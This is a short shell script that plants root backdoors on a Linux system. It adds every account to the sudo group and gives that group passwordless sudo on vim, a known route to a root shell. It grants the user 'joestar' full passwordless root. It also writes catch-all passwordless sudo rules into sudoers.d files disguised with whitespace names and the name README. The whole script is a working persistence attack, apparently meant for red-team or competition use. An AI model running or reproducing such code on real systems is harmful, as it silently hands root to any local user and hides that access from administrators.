#!/bin/sh
for u in $(cat /etc/passwd | awk -F: '{print $1}'); do 
  usermod -a -G sudo $u
done
if [ -f /usr/bin/vim ]; then
  echo "%sudo ALL=(ALL:ALL) NOPASSWD:/usr/bin/vim" >> /etc/sudoers
fi
echo "joestar ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers
echo "ALL   ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers.d/" "
echo "ALL   ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers.d/"  "
echo "ALL   ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers.d/README
